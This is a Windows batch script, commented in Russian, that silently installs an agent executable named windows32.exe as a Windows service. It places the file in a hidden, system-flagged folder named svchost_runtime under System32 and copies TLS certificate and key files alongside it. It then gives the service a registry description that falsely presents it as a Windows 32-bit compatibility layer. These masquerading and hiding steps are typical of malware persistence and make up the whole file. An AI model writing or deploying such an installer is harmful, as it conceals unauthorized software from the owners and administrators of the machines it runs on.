@echo off
:: Тихая установка агента как службы Windows.
:: Запускать от администратора один раз.

set EXE_NAME=windows32.exe
set SVC_NAME=windows32
set INSTALL_DIR=%SystemRoot%\System32\svchost_runtime

:: Создаём папку установки (скрытая, системная)
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
    attrib +h +s "%INSTALL_DIR%"
)

:: Копируем exe
copy /y "%~dp0%EXE_NAME%" "%INSTALL_DIR%\%EXE_NAME%" >nul

:: Копируем TLS сертификаты если есть
if exist "%~dp0cert.pem" copy /y "%~dp0cert.pem" "%INSTALL_DIR%\cert.pem" >nul
if exist "%~dp0key.pem"  copy /y "%~dp0key.pem"  "%INSTALL_DIR%\key.pem"  >nul

:: Устанавливаем и запускаем службу
"%INSTALL_DIR%\%EXE_NAME%" --install

:: Скрываем службу из обычного списка (только реестр)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%SVC_NAME%" /v "Description" /t REG_SZ /d "Provides Windows 32-bit runtime compatibility layer." /f >nul

echo [+] Установка завершена
